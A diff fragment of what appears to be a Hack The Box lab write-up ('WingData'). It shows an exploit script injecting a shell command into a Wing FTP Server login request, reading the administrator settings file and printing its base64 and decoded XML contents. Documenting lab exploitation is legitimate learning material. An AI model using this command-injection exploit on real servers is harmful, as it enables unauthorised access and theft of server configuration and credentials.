@@ -519,5 +519,33 @@ b3JDb2RlPjwvVHdvRmFjdG9yQ29kZT4KICAgIDwvQURNSU4+CjwvQURNSU5fQUNDT1VOVFM+Cg==
 ```
 
 ```
+ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "base64 ./Data/_ADMINISTRATOR/settings.xml"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 ./Data/_ADMINISTRATOR/settings.xml' and username: 'anonymous'
+[+] UID extracted: b22ce09d7375ca8ad307161333e92636f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: b22ce09d7375ca8ad307161333e92636f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8QWRtaW5pc3RyYXRvciBEZXNjcmlwdGlvbj0iV2luZyBG
+VFAgU2VydmVyIEFkbWluaXN0cmF0b3IgT3B0aW9ucyI+CiAgICA8SHR0cFBvcnQ+NTQ2NjwvSHR0
+cFBvcnQ+CiAgICA8SHR0cFNlY3VyZT4wPC9IdHRwU2VjdXJlPgogICAgPEFkbWluTG9nZmlsZUVu
+YWJsZT4xPC9BZG1pbkxvZ2ZpbGVFbmFibGU+CiAgICA8QWRtaW5Mb2dmaWxlRmlsZU5hbWU+QWRt
+aW4tJVktJU0tJUQubG9nPC9BZG1pbkxvZ2ZpbGVGaWxlTmFtZT4KICAgIDxBZG1pbkxvZ2ZpbGVN
+YXhzaXplPjA8L0FkbWluTG9nZmlsZU1heHNpemU+CiAgICA8RW5hYmxlUG9ydFVQblA+MDwvRW5h
+YmxlUG9ydFVQblA+CjwvQWRtaW5pc3RyYXRvcj4K
+
+<?xml version="1.0" ?>
+<Administrator Description="Wing FTP Server Administrator Options">
+    <HttpPort>5466</HttpPort>
+    <HttpSecure>0</HttpSecure>
+    <AdminLogfileEnable>1</AdminLogfileEnable>
+    <AdminLogfileFileName>Admin-%Y-%M-%D.log</AdminLogfileFileName>
+    <AdminLogfileMaxsize>0</AdminLogfileMaxsize>
+    <EnablePortUPnP>0</EnablePortUPnP>
+</Administrator>
+```
+
+```
 
 ```
